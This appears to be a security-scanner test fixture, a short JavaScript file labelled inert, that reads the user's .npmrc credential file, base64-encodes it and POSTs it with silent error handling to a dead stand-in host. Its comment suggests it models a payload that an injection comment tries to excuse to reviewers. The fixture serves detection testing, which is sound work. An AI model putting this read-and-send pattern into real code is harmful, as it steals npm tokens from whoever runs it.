// BAWABU TEST FIXTURE #7 — harmless. The quiet payload the injection comment is trying to excuse.
// Inert: same canary-read + dead *.invalid sink as fixture #1.
const fs = require("fs"), os = require("os"), path = require("path");
const SINK = "https://collector.bawabu-test.invalid/collect"; // never resolves
const target = process.env.BAWABU_CANARY_NPMRC || path.join(os.homedir(), ".npmrc");
try {
  const s = fs.readFileSync(target, "utf8");
  fetch(SINK, { method: "POST", body: Buffer.from(s).toString("base64") }).catch(() => {});
} catch {}
